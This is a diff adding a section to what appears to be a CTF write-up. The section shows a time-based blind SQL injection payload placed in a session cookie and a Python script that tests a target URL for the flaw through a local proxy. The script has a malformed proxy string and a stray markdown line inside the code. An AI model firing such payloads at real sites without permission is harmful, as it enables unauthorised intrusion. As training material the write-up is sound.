@@ -314,6 +314,49 @@ Upgrade-Insecure-Requests: 1
 ```
 It took forever to load since I have put `sleep(20000)` here, now if I run it again by substituting 20000 to 2 - it acts normally.
 
+There is an automated way to do it by writing a python script, thanks to the tutorial video by [Rana Khalil](https://www.youtube.com/watch?v=vhDhB9uVbGA)
+I managed to write a similar with my own payload `'+(select*from(select(sleep(20)))a)+'`
+
+```
+import sys
+import requests
+import urllib3
+import urllib
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http:127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
+
+
+def blind_sqli_check(url):
+    sqli_payload = "'+(select*from(select(sleep(20)))a)+'"
+    sqli_payload_encoded  = urllib.parse.quote(sqli_payload) 
+    cookies = {'admin_session_id': '959eea471f42f2c4226942d3c620661c' + sqli_payload_encoded, 'session_id': '903da9688d0a0d2a8d04f36da0af44a1'}
+    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+    if int(r.elapsed.total_seconds()) > 20:
+        print("(+) Vulnerable to blind-based SQL injection")
+    else:
+        print("(-) Not vulnerable to blind-based SQL injection")
+*Don't Copy my terrible Script :(*
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    url = sys.argv[1]
+    print("(+) Checking if tracking cookie is vulnerable to time-based SQLi...")
+    blind_sqli_check(url)
+
+if __name__ == "__main__":
+    main()
+
+```
+The result is promising: 
+![image](https://user-images.githubusercontent.com/94167587/144337839-e646739d-0100-4177-9d99-3170f3e3082d.png)
+
+
 **Step 2 - 
 
 Having said that, there is another easy and lazy way to win this flag - this is not an easy SQLi point to find though. I have encountered such function while doing flag 2 but because of this it also blinded me from thinking that it is related to flag 3. In a real test, however, we should go through each of the functionality one by one (and systematically) so we won’t miss any. (or, for completeness since the client paid us for that)
